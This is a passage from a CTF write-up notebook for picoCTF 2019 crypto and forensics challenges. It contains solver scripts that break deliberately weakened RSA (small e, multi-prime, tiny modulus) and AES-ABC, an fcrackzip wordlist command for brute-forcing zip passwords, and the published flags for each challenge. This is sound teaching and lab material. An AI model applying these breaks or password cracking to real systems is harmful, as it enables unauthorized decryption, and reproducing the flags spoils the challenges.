d: 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729
Outstanding move!!!


#### NEW PROBLEM ####
p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
ciphertext : 4699954403535877728943212516495239996093493409461427795061606820019520385578403561120385764629211115765041521697969103538878070126128059106090044437598460283768854171495071441758538307495380993096127617485853022154997313813963653770523746165616397996160676397490439829116013032980784837094738356175991364395455204835324455810814055944764109234129010492269581408600009386595427991513236458464354768157315483091898970879300954540175247825718514107084608264564889098214264863604883438961600216645976532706988513244819161793096143681897379315082134265617697635800727770233591268184387676917842275673893483582432877323662
e : 65537
n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
##### PRODUCE THE FOLLOWING ####
plaintext
</code></pre><p>We know: <code>d=e^-1 mod toitent(n)</code><p>We need to find <code>q</code>. Then calculate <code>toitent(n)</code> to find <code>d</code>.<p>We know <code>m = ciphertext^d mod n</code> so we have <code>pow(ciphertext,d,n)</code><pre><code>IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
plaintext: 14311663942709674867122208214901970650496788151239520971623411712977119645236321549653782653
Outstanding move!!!


If you convert the last plaintext to a hex number, then ascii, you'll find what you need! ;)
</code></pre><p>Plaintext is in decimal.<h3><a class=header href=#flag-5 id=flag-5>Flag</a></h3><p><code>picoCTF{wA8_th4t$_ill3aGal..o1c355060}</code><h3><a class=header href=#solver id=solver>Solver</a></h3><pre><code class=language-python>import binascii
from pwn import *

# Not my initial code, my function wasn't this clean
MMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1]

r = remote('2019shell1.picoctf.com', 2611)

# Q1
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
q = int([l for l in lines.split('\n') if 'q :' in l][0].split(':')[1].strip(), 10)
p = int([l for l in lines.split('\n') if 'p :' in l][0].split(':')[1].strip(), 10)
r.sendline('Y')
print r.recvuntil('n:')
ans = q * p
print 'Sending: {}'.format(ans)
r.sendline('{}'.format(ans))

# Q2
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
p = int([l for l in lines.split('\n') if 'p :' in l][0].split(':')[1].strip(), 10)
n = int([l for l in lines.split('\n') if 'n :' in l][0].split(':')[1].strip(), 10)
r.sendline('Y')
print r.recvuntil('q:')
ans = n / p
print 'Sending: {}'.format(ans)
r.sendline('{}'.format(ans))

# Q3
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
r.sendline('N')

# Q4
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
q = int([l for l in lines.split('\n') if 'q :' in l][0].split(':')[1].strip(), 10)
p = int([l for l in lines.split('\n') if 'p :' in l][0].split(':')[1].strip(), 10)
r.sendline('Y')
print r.recvuntil('totient(n):')
ans = (q - 1) * (p - 1)
print 'Sending: {}'.format(ans)
r.sendline('{}'.format(ans))

# Q5
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
plain = int([l for l in lines.split('\n') if 'plaintext :' in l][0].split(':')[1].strip(), 10)
e = int([l for l in lines.split('\n') if 'e :' in l][0].split(':')[1].strip(), 10)
n = int([l for l in lines.split('\n') if 'n :' in l][0].split(':')[1].strip(), 10)
r.sendline('Y')
print r.recvuntil('ciphertext:')
ans = pow(plain, e, n)
print 'Sending: {}'.format(ans)
r.sendline('{}'.format(ans))

# Q6
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
r.sendline('N')

# Q7
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
q = int([l for l in lines.split('\n') if 'q :' in l][0].split(':')[1].strip(), 10)
p = int([l for l in lines.split('\n') if 'p :' in l][0].split(':')[1].strip(), 10)
e = int([l for l in lines.split('\n') if 'e :' in l][0].split(':')[1].strip(), 10)
r.sendline('Y')
print r.recvuntil('d:')
ans = MMI(e, (q - 1) * (p - 1))
print 'Sending: {}'.format(ans)
r.sendline('{}'.format(ans))

# Q8
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
p = int([l for l in lines.split('\n') if 'p :' in l][0].split(':')[1].strip(), 10)
cipher = int([l for l in lines.split('\n') if 'ciphertext :' in l][0].split(':')[1].strip(), 10)
e = int([l for l in lines.split('\n') if 'e :' in l][0].split(':')[1].strip(), 10)
n = int([l for l in lines.split('\n') if 'n :' in l][0].split(':')[1].strip(), 10)
r.sendline('Y')
print r.recvuntil('plaintext:')
q = n / p
d = MMI(e, (q - 1) * (p - 1))
ans = pow(cipher, d, n)
print 'Sending: {}'.format(ans)
r.sendline('{}'.format(ans))
lines = r.recvall()
print lines
print 'In hex: {}'.format(hex(ans))
print binascii.unhexlify(hex(ans)[2:])
</code></pre><h1><a class=header href=#picoctf19-minirsa id=picoctf19-minirsa>PicoCTF19 miniRSA</a></h1><h2><a class=header href=#challenge-6 id=challenge-6>Challenge</a></h2><p>Lets decrypt this: <a href=https://2019shell1.picoctf.com/static/5829e4221ce46d77254176b3e04f9e46/ciphertext>ciphertext</a>? Something seems a bit small<pre><code>N: 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673
e: 3

ciphertext (c):  
2205316413931134031074603746928247799030155221252519872649594750678791181631768977116979076832403970846785672184300449694813635798586699205901153799059293422365185314044451205091048294412538673475392478762390753946407342073522966852394341
</code></pre><h2><a class=header href=#hints-4 id=hints-4>Hints</a></h2><p>RSA <a href=https://en.wikipedia.org/wiki/RSA_(cryptosystem)>tutorial</a><p>How could having too small an e affect the security of this 2048 bit key?<p>Make sure you dont lose precision, the numbers are pretty big (besides the e value)<h2><a class=header href=#solution-6 id=solution-6>Solution</a></h2><p>We know <code>c = m^e % n</code> where <code>m</code> is the plaintext. E is small, so we could conceivably compute the cube root.<p><a href=https://github.com/Ganapati/RsaCtfTool>RSACTFTool</a><p><code>$ python RsaCtfTool.py -e 3 -n TODO --uncipher TODO</code><pre><code class=language-python>c = 2205316413931134031074603746928247799030155221252519872649594750678791181631768977116979076832403970846785672184300449694813635798586699205901153799059293422365185314044451205091048294412538673475392478762390753946407342073522966852394341
def find_cubic_root(n):
    a = 1
    b = n
    while b - a &gt; 1:
        mid = (a + b) // 2
        if mid**3 &gt; n:
            b = mid
        else:
            a = mid

    if a ** 3 == n:
        return a
    elif b ** 3 == n:
        return b
    else:
        return 0

m = find_cubic_root(c)
h = hex(m)
print(h)
p = str(hex(m)[2:]).decode('hex')
print(p)
</code></pre><h2><a class=header href=#flag-6 id=flag-6>Flag</a></h2><p><code>picoCTF{n33d_a_lArg3r_e_0a41ef50}</code><h1><a class=header href=#picoctf19-b00tl3grsa2 id=picoctf19-b00tl3grsa2>PicoCTF19 b00tl3gRSA2</a></h1><h2><a class=header href=#challenge-7 id=challenge-7>Challenge</a></h2><p>In RSA d is alot bigger than e, why dont we use d to encrypt instead of e? Connect with <code>nc 2019shell1.picoctf.com 40480</code><h2><a class=header href=#hints-5 id=hints-5>Hints</a></h2><p>What is e generally?<h2><a class=header href=#solution-7 id=solution-7>Solution</a></h2><pre><code class=language-bash>$ nc 2019shell1.picoctf.com 40480
c: 2227211376737039937815591841583322219566252533744426276462773206888045748184290863025760295434296972640543617203018637540296885139307674289872088998737701404390693351315297815971174195313821697937235534517169830898020526018142713263804256799943353034620585446162361316614966452481137685467482096376041045553
n: 122257867992330123694849053069496256961142485055188967457363024625095520165285145992678350145142588928812101783584788345493756672241488097846310440568192896037282979149068599758350070038965853680896117225473022760423760319172301276128334331212378438916320597811225476816307146390872876401243235221507551945427
e: 9040109072597643764976097642168223465121938486312247071095430326887298636205072210820136484785098279582883641961821327223747575166428907672966727115880535670506948628864730176719767934575396842177316167915271868800274457299592123662593058375645834359674722354498324615375871394016309861546258126561404675201
</code></pre><p>We seem to be given another message which we need to decipher. <code>e</code> is actually quite large this time.<p>Let's try: <a href=https://github.com/Ganapati/RsaCtfTool>RSACTFTool</a><pre><code class=language-bash>$ python RsaCtfTool.py -n 122257867992330123694849053069496256961142485055188967457363024625095520165285145992678350145142588928812101783584788345493756672241488097846310440568192896037282979149068599758350070038965853680896117225473022760423760319172301276128334331212378438916320597811225476816307146390872876401243235221507551945427 -e 9040109072597643764976097642168223465121938486312247071095430326887298636205072210820136484785098279582883641961821327223747575166428907672966727115880535670506948628864730176719767934575396842177316167915271868800274457299592123662593058375645834359674722354498324615375871394016309861546258126561404675201 --uncipher 2227211376737039937815591841583322219566252533744426276462773206888045748184290863025760295434296972640543617203018637540296885139307674289872088998737701404390693351315297815971174195313821697937235534517169830898020526018142713263804256799943353034620585446162361316614966452481137685467482096376041045553
[+] Clear text :                                                                                                       picoCTF{bad_1d3a5_9093280}
</code></pre><h2><a class=header href=#flag-7 id=flag-7>Flag</a></h2><p><code>picoCTF{bad_1d3a5_9093280}</code><h1><a class=header href=#picoctf19-b00tl3grsa3 id=picoctf19-b00tl3grsa3>PicoCTF19 b00tl3gRSA3</a></h1><h2><a class=header href=#challenge-8 id=challenge-8>Challenge</a></h2><p>Why use p and q when I can use more? Connect with <code>nc 2019shell1.picoctf.com 47259</code>.<h2><a class=header href=#hints-6 id=hints-6>Hints</a></h2><p>There's more prime factors than p and q, finding d is going to be different.<h2><a class=header href=#solution-8 id=solution-8>Solution</a></h2><pre><code class=language-bash>c: 115907801461313158965377829999414983694947203616237913344000889317863736758531019893044675670470719016550935245498480076257808295666213250671705647052952985160750026716806648346149941402624934593771389255609760111103294960111447016315854679477953928170272549763616429741944532210423007533197499524142851496972167029509575747311697967407757038
n: 505186941595372767417204483069962456956876881699737700099184038281005218489284390560248445518556484612403558042307234530875326885844802849178814990909325938778660794800605676053790848757817436721133841429031968710360577866052273624130574100503249945336634715178677448719258396584686548296179014568446031310597909656036281488083645611195095047
e: 65537
</code></pre><p>Let's try <a href=https://github.com/Ganapati/RsaCtfTool>RSACTFTool</a>.<pre><code class=language-bash>$ python RsaCtfTool.py -n 505186941595372767417204483069962456956876881699737700099184038281005218489284390560248445518556484612403558042307234530875326885844802849178814990909325938778660794800605676053790848757817436721133841429031968710360577866052273624130574100503249945336634715178677448719258396584686548296179014568446031310597909656036281488083645611195095047 -e 65537 --uncipher 115907801461313158965377829999414983694947203616237913344000889317863736758531019893044675670470719016550935245498480076257808295666213250671705647052952985160750026716806648346149941402624934593771389255609760111103294960111447016315854679477953928170272549763616429741944532210423007533197499524142851496972167029509575747311697967407757038
[+] Clear text : ,qDhpُQ&gt;ML)e
</code></pre><p>I guess this tool doesn't support multi-prime RSA. So lets try to find some factors.<p><a href=https://www.alpertron.com.ar/ECM.HTM>Integer factorization calculator</a><p>This website also gives us the <code>totient(n)</code><p><code>phi = 505186940041440309962987635962658666379959200685840459741094888209162455093388423841205618560994296346081983144064357582395160227000498559919431103749690592351484252144388376192135608477301020357011256865836603207375248074893376070863434356494230539317810776913265268813717240782848195688483960936781393194407125679299624960000000000000000000</code><p>Let's just calculate this manually:<pre><code class=language-python>from pwn import *
from __future__ import print

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

c = 115907801461313158965377829999414983694947203616237913344000889317863736758531019893044675670470719016550935245498480076257808295666213250671705647052952985160750026716806648346149941402624934593771389255609760111103294960111447016315854679477953928170272549763616429741944532210423007533197499524142851496972167029509575747311697967407757038
n = 505186941595372767417204483069962456956876881699737700099184038281005218489284390560248445518556484612403558042307234530875326885844802849178814990909325938778660794800605676053790848757817436721133841429031968710360577866052273624130574100503249945336634715178677448719258396584686548296179014568446031310597909656036281488083645611195095047
e = 65537
phi=505186940041440309962987635962658666379959200685840459741094888209162455093388423841205618560994296346081983144064357582395160227000498559919431103749690592351484252144388376192135608477301020357011256865836603207375248074893376070863434356494230539317810776913265268813717240782848195688483960936781393194407125679299624960000000000000000000    

d = modinv(e, phi) # c^d = m 
m = pow(c, d, n)
flag = unhex(hex(m)[2:])
print(flag)

</code></pre><h2><a class=header href=#flag-8 id=flag-8>Flag</a></h2><p><code>picoCTF{too_many_fact0rs_3978938}</code><h1><a class=header href=#picoctf19-john_pollard id=picoctf19-john_pollard>PicoCTF19 john_pollard</a></h1><h2><a class=header href=#challenge-9 id=challenge-9>Challenge</a></h2><p>Sometimes RSA <a href=https://2019shell1.picoctf.com/static/ccd7ba84ead965bd2033a54c4dbb8ae0/cert>certificates</a> are breakable<pre><code>-----BEGIN CERTIFICATE-----
MIIB6zCB1AICMDkwDQYJKoZIhvcNAQECBQAwEjEQMA4GA1UEAxMHUGljb0NURjAe
Fw0xOTA3MDgwNzIxMThaFw0xOTA2MjYxNzM0MzhaMGcxEDAOBgNVBAsTB1BpY29D
VEYxEDAOBgNVBAoTB1BpY29DVEYxEDAOBgNVBAcTB1BpY29DVEYxEDAOBgNVBAgT
B1BpY29DVEYxCzAJBgNVBAYTAlVTMRAwDgYDVQQDEwdQaWNvQ1RGMCIwDQYJKoZI
hvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQABMA0GCSqGSIb3DQEBAgUAA4IBAQAH
al1hMsGeBb3rd/Oq+7uDguueopOvDC864hrpdGubgtjv/hrIsph7FtxM2B4rkkyA
eIV708y31HIplCLruxFdspqvfGvLsCynkYfsY70i6I/dOA6l4Qq/NdmkPDx7edqO
T/zK4jhnRafebqJucXFH8Ak+G6ASNRWhKfFZJTWj5CoyTMIutLU9lDiTXng3rDU1
BhXg04ei1jvAf0UrtpeOA6jUyeCLaKDFRbrOm35xI79r28yO8ng1UAzTRclvkORt
b8LMxw7e+vdIntBGqf7T25PLn/MycGPPvNXyIsTzvvY/MXXJHnAqpI5DlqwzbRHz
q16/S1WLvzg4PsElmv1f
-----END CERTIFICATE-----
</code></pre><h2><a class=header href=#hints-7 id=hints-7>Hints</a></h2><p>The flag is in the format picoCTF{p,q}<p>Try swapping p and q if it does not work<h2><a class=header href=#solution-9 id=solution-9>Solution</a></h2><p>Let's see what information we can find out about this certificate with this <a href=https://redkestrel.co.uk/products/decoder/>Certificate Decoder</a><pre><code>Check 	Result
Expiry 	FAILED - Expired Jun 26 2019
Debian RSA Weak Key 	Unable to check
Key Size 	WARNING (53 bits)
MD5 	PASSED - Not using the MD5 algorithm
SHA1 	PASSED - Not using the SHA1 algorithm

Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number: 12345 (0x3039)
        Signature Algorithm: md2WithRSAEncryption
        Issuer: CN=PicoCTF
        Validity
            Not Before: Jul  8 07:21:18 2019 GMT
            Not After : Jun 26 17:34:38 2019 GMT
        Subject: OU=PicoCTF, O=PicoCTF, L=PicoCTF, ST=PicoCTF, C=US, CN=PicoCTF
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (53 bit)
                Modulus: 4966306421059967 (0x11a4d45212b17f)
                Exponent: 65537 (0x10001)
    Signature Algorithm: md2WithRSAEncryption
         07:6a:5d:61:32:c1:9e:05:bd:eb:77:f3:aa:fb:bb:83:82:eb:
         9e:a2:93:af:0c:2f:3a:e2:1a:e9:74:6b:9b:82:d8:ef:fe:1a:
         c8:b2:98:7b:16:dc:4c:d8:1e:2b:92:4c:80:78:85:7b:d3:cc:
         b7:d4:72:29:94:22:eb:bb:11:5d:b2:9a:af:7c:6b:cb:b0:2c:
         a7:91:87:ec:63:bd:22:e8:8f:dd:38:0e:a5:e1:0a:bf:35:d9:
         a4:3c:3c:7b:79:da:8e:4f:fc:ca:e2:38:67:45:a7:de:6e:a2:
         6e:71:71:47:f0:09:3e:1b:a0:12:35:15:a1:29:f1:59:25:35:
         a3:e4:2a:32:4c:c2:2e:b4:b5:3d:94:38:93:5e:78:37:ac:35:
         35:06:15:e0:d3:87:a2:d6:3b:c0:7f:45:2b:b6:97:8e:03:a8:
         d4:c9:e0:8b:68:a0:c5:45:ba:ce:9b:7e:71:23:bf:6b:db:cc:
         8e:f2:78:35:50:0c:d3:45:c9:6f:90:e4:6d:6f:c2:cc:c7:0e:
         de:fa:f7:48:9e:d0:46:a9:fe:d3:db:93:cb:9f:f3:32:70:63:
         cf:bc:d5:f2:22:c4:f3:be:f6:3f:31:75:c9:1e:70:2a:a4:8e:
         43:96:ac:33:6d:11:f3:ab:5e:bf:4b:55:8b:bf:38:38:3e:c1:
         25:9a:fd:5f
</code></pre><p>The key size is 53 bits which is rather weak. The modulus <code>4966306421059967</code> is <em>tiny</em>.<p>Let's find the factors: <a href="http://factordb.com/index.php?query=4966306421059967">FactorDB</a> == 67867967 & 73176001<p>since <code>4966306421059967</code> == <code>n</code><p><code>picoCTF{67867967,73176001}</code> didn't work but <code>picoCTF{73176001,67867967}</code> works.<h2><a class=header href=#flag-9 id=flag-9>Flag</a></h2><p><code>picoCTF{73176001,67867967}</code><h1><a class=header href=#picoctf19-aes-abc id=picoctf19-aes-abc>PicoCTF19 AES-ABC</a></h1><h2><a class=header href=#challenge-10 id=challenge-10>Challenge</a></h2><p>AES-ECB is bad, so I rolled my own cipher block chaining mechanism - Addition Block Chaining! You can find the source here: <a href=https://2019shell1.picoctf.com/static/f8b82da049bf23cb598c4bdac73207e8/aes-abc.py>aes-abc.py</a>. The AES-ABC flag is <a href=https://2019shell1.picoctf.com/static/f8b82da049bf23cb598c4bdac73207e8/body.enc.ppm>body.enc.ppm</a><p>aes-abc.py<pre><code class=language-python>#!/usr/bin/env python

from Crypto.Cipher import AES
from key import KEY
import os
import math

BLOCK_SIZE = 16
UMAX = int(math.pow(256, BLOCK_SIZE))


def to_bytes(n):
    s = hex(n)
    s_n = s[2:]
    if 'L' in s_n:
        s_n = s_n.replace('L', '')
    if len(s_n) % 2 != 0:
        s_n = '0' + s_n
    decoded = s_n.decode('hex')

    pad = (len(decoded) % BLOCK_SIZE)
    if pad != 0: 
        decoded = &quot;\0&quot; * (BLOCK_SIZE - pad) + decoded
    return decoded


def remove_line(s):
    # returns the header line, and the rest of the file
    return s[:s.index('\n') + 1], s[s.index('\n')+1:]


def parse_header_ppm(f):
    data = f.read()

    header = &quot;&quot;

    for i in range(3):
        header_i, data = remove_line(data)
        header += header_i

    return header, data
        

def pad(pt):
    padding = BLOCK_SIZE - len(pt) % BLOCK_SIZE
    return pt + (chr(padding) * padding)


def aes_abc_encrypt(pt):
    cipher = AES.new(KEY, AES.MODE_ECB)
    ct = cipher.encrypt(pad(pt))

    blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)]
    iv = os.urandom(16)
    blocks.insert(0, iv)
    
    for i in range(len(blocks) - 1):
        prev_blk = int(blocks[i].encode('hex'), 16)
        curr_blk = int(blocks[i+1].encode('hex'), 16)

        n_curr_blk = (prev_blk + curr_blk) % UMAX
        blocks[i+1] = to_bytes(n_curr_blk)

    ct_abc = &quot;&quot;.join(blocks)
 
    return iv, ct_abc, ct


if __name__==&quot;__main__&quot;:
    with open('flag.ppm', 'rb') as f:
        header, data = parse_header_ppm(f)
    
    iv, c_img, ct = aes_abc_encrypt(data)

    with open('body.enc.ppm', 'wb') as fw:
        fw.write(header)
        fw.write(c_img)
</code></pre><h2><a class=header href=#hints-8 id=hints-8>Hints</a></h2><p>You probably want to figure out what the flag looks like in ECB form...<h2><a class=header href=#solution-10 id=solution-10>Solution</a></h2><p>Let's take a look at how it was encrypted:<pre><code class=language-python>def aes_abc_encrypt(pt):
    cipher = AES.new(KEY, AES.MODE_ECB)
    ct = cipher.encrypt(pad(pt))

    blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)]
    iv = os.urandom(16)
    blocks.insert(0, iv)
    
    for i in range(len(blocks) - 1):
        prev_blk = int(blocks[i].encode('hex'), 16)
        curr_blk = int(blocks[i+1].encode('hex'), 16)

        n_curr_blk = (prev_blk + curr_blk) % UMAX
        blocks[i+1] = to_bytes(n_curr_blk)

    ct_abc = &quot;&quot;.join(blocks)
 
    return iv, ct_abc, ct
</code></pre><p>Uhoh, it's in ECB (Electronic Codebook) mode which encrypts data 16 bits at a time.<p>But instead of XOR-ing the ECB blocks, it seems to be adding them. Weird, did they roll their own crypto algorithm?<p>Let's first convert all the ciphertext blocks back to ecb blocks.<p>Let's create an aes_abc_decrypt(ct):<pre><code class=language-python>def aes_abc_decrypt(c_img):
    blocks = [c_img[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(c_img) / BLOCK_SIZE)]

    for i in range(len(blocks) - 2, -1, -1):
        n_curr_blk = from_bytes(blocks[i+1])
        n_prev_blk = from_bytes(blocks[i])

        curr_blk = (n_curr_blk - n_prev_blk) % UMAX

        blocks[i+1] = to_bytes(curr_blk)

    ct = ''.join(blocks[1:])

    return ct
</code></pre><p>Final script is in assets<pre><code>$ file decrypt.ppm
decrypt.ppm: Netpbm image data, size = 1895 x 820, rawbits, pixmap
</code></pre><p>Use this <a href=https://cloudconvert.com/ppm-to-pdf>converter</a><p>Looks like garbage maybe it's not the correct size... perhaps brute force necessary.<h2><a class=header href=#flag-10 id=flag-10>Flag</a></h2><p><code>UNSOLVED</code><h1><a class=header href=#forensics id=forensics>Forensics</a></h1><h2><a class=header href=#unknown-file id=unknown-file>Unknown file</a></h2><pre><code class=language-bash>$ file hardshells
hardshells: Zip archive data, at least v1.0 to extract
$ mv hardshells hardshells.zip
</code></pre><h2><a class=header href=#data-file-tricks id=data-file-tricks>Data file tricks</a></h2><pre><code class=language-bash>$ file dat
dat: data
</code></pre><p>Use <code>hexedit</code> or <code>bless</code> to open.<p>If you find:<p><code>IHDR</code> or <code>IDAT</code> - are section headers for PNG. Search for png magic headers/bytes<p><code>@ICC_PROFILE</code> or <code>Adobe</code> anywhere - Search for JPEG Magic headers/bytes<h2><a class=header href=#gif id=gif>GIF</a></h2><h3><a class=header href=#split-frames-of-gif id=split-frames-of-gif>Split frames of GIF</a></h3><p><code>$ convert picasso.gif %02d.png</code><h2><a class=header href=#png id=png>PNG</a></h2><h3><a class=header href=#convert-white-pixels-into-transparent-pixels-several-files id=convert-white-pixels-into-transparent-pixels-several-files>Convert white pixels into transparent pixels (several files)</a></h3><p><code>$ ls *.png | while read filename; do convert $filename -transparent white $filename; done</code><h3><a class=header href=#stackoverlay-images-on-top-of-each-other id=stackoverlay-images-on-top-of-each-other>Stack/Overlay images on top of each other</a></h3><p><code>$ ls *.png | while read filename; do convert $filename 00.png -gravity center -composite 00.png; done</code><h2><a class=header href=#jpeg id=jpeg>JPEG</a></h2><h3><a class=header href=#placeholder id=placeholder>placeholder</a></h3><h2><a class=header href=#zip id=zip>Zip</a></h2><p><code>PK</code> - ZIP Magic File Header<h3><a class=header href=#bruteforce-zip-password id=bruteforce-zip-password>Bruteforce Zip Password</a></h3><p>Download rockyou.txt (it's a wordlist)<p><code>$ fcrackzip -v -D -u -p rockyou.txt hardshells.zip</code><h2><a class=header href=#filesystems id=filesystems>Filesystems</a></h2><pre><code class=language-bash>$ file dat
dat: Minix filesystem, V1, 30 char names, 20 zones
$ mkdir mountpoint &amp;&amp; sudo mount dat mountpoint/
</code></pre><h2><a class=header href=#pcap-packet-capture id=pcap-packet-capture>PCAP (Packet Capture)</a></h2><p><code>$ tcpflow -r thunder.pcap</code> - Will output files that go from one IP to another<p><code>$ binwalk -e thunder.pcap</code><p><code>$ foremost thunder.pcap</code><p><code>$ strings thunder.pcap | grep -r "flag"</code> - Shot in the dark<h2><a class=header href=#wireshark id=wireshark>Wireshark</a></h2><p>Given a <code>.pem</code> file, go to Settings > Preferences > Protocol > SSL
Add RSA key list with <code>.pem</code> for IP Address you need to decrypt
Enter name for SSL debug file<h2><a class=header href=#steganography id=steganography>Steganography</a></h2><p><a href=https://0xrick.github.io/lists/stego/>https://0xrick.github.io/lists/stego/</a><h1><a class=header href=#picoctf19-garden id=picoctf19-garden>PicoCTF19 Garden</a></h1><h2><a class=header href=#challenge-11 id=challenge-11>Challenge</a></h2><p>This <a href=https://2019shell1.picoctf.com/static/3e1f573c9b18e87b6764ec3a36868b5a/garden.jpg>garden</a> contains more than it seems. You can also find the file in /problems/glory-of-the-garden_0_25ece79ae00914856938a4b19d0e31af on the shell server.<p><img src=ctf/forensics/assets/garden.jpg alt=garden.jpg title=Garden.jpg><h2><a class=header href=#hints-9 id=hints-9>Hints</a></h2><p>What is a hex editor?<h2><a class=header href=#solution-11 id=solution-11>Solution</a></h2><p>Open up a hex editor and search for pico...<pre><code class=language-bash>$ strings garden.jpg | grep -a pico
Here is a flag &quot;picoCTF{more_than_m33ts_the_3y30cAf8c6B}&quot;
</code></pre><p>Also works<h2><a class=header href=#flag-11 id=flag-11>Flag</a></h2><p><code>picoCTF{more_than_m33ts_the_3y3f089EdF0}</code><h1><a class=header href=#picoctf19-unzip id=picoctf19-unzip>PicoCTF19 Unzip</a></h1><h2><a class=header href=#challenge-12 id=challenge-12>Challenge</a></h2><p>Can you unzip this <a href=https://2019shell1.picoctf.com/static/37762a7e5774d7d6c1bc79e8e1758ef9/flag.zip>file</a> and get the flag?<p><img src=ctf/forensics/assets/flag.png alt=flag.png title=Flag.png><h2><a class=header href=#hints-10 id=hints-10>Hints</a></h2><p>put the flag in the format picoCTF{XXXXX}<h2><a class=header href=#solution-12 id=solution-12>Solution</a></h2><p>Unzip the file... This isn't a real problem<h2><a class=header href=#flag-12 id=flag-12>Flag</a></h2><p><code>picoCTF{unz1pp1ng_1s_3a5y}</code><h1><a class=header href=#picoctf19-so-meta id=picoctf19-so-meta>PicoCTF19 So Meta</a></h1><h2><a class=header href=#challenge-13 id=challenge-13>Challenge</a></h2><p>Find the flag in this <a href=https://2019shell1.picoctf.com/static/051b66965016a24bb62e5af66b28cbc0/pico_img.png>picture</a>. You can also find the file in /problems/so-meta_2_da856426d694a4f0637bf1b169d8524e.<p><img src=ctf/forensics/assets/pico_img.png alt=pico_img.png title=pico_img.png><h2><a class=header href=#hints-11 id=hints-11>Hints</a></h2><p>What does meta mean in the context of files?<p>Ever hear of metadata?<h2><a class=header href=#solution-13 id=solution-13>Solution</a></h2><p>Open up the file in a hex editor...<pre><code class=language-bash>$ strings pico_img.png | grep -a pico
picoCTF{s0_m3ta_3d6ced35}
</code></pre><h2><a class=header href=#flag-13 id=flag-13>Flag</a></h2><p><code>picoCTF{s0_m3ta_3d6ced35}</code><h1><a class=header href=#picoctf19-lies-within id=picoctf19-lies-within>PicoCTF19 Lies Within</a></h1><h2><a class=header href=#challenge-14 id=challenge-14>Challenge</a></h2><p>Theres something in the <a href=https://2019shell1.picoctf.com/static/aec3861fc4d5bce4d39dc0db196426de/buildings.png>building</a>. Can you retrieve the flag?<p><img src=ctf/forensics/assets/buildings.png alt=buildings.png title=buildings.png><h2><a class=header href=#hints-12 id=hints-12>Hints</a></h2><p>There is data encoded somewhere, there might be an online decoder<h2><a class=header href=#solution-14 id=solution-14>Solution</a></h2><p>Opened up in hexedit, checked for <code>pico</code> -> no results<pre><code class=language-bash>$ strings buildings.png | grep -a pico
</code></pre><p>Used this online tool: <a href=https://stylesuxx.github.io/steganography/>https://stylesuxx.github.io/steganography/</a><h2><a class=header href=#flag-14 id=flag-14>Flag</a></h2><p><code>picoCTF{h1d1ng_1n_th3_b1t5}</code><h1><a class=header href=#picoctf19-extensions id=picoctf19-extensions>PicoCTF19 Extensions</a></h1><h2><a class=header href=#challenge-15 id=challenge-15>Challenge</a></h2><p>This is a really weird text file <a href=https://2019shell1.picoctf.com/static/45886ed4b6d5d1dc74c4944fcf4b4041/flag.txt>TXT</a>? Can you find the flag?<h2><a class=header href=#hints-13 id=hints-13>Hints</a></h2><p>How do operating systems know what kind of file it is? (It's not just the ending!<p>Make sure to submit the flag as picoCTF{XXXXX}<h2><a class=header href=#solution-15 id=solution-15>Solution</a></h2><pre><code class=language-bash>$ file flag.txt
flag.txt: PNG image data, 1697 x 608, 8-bit/color RGB, non-interlaced
$ cp flag.txt flag_extensions.png
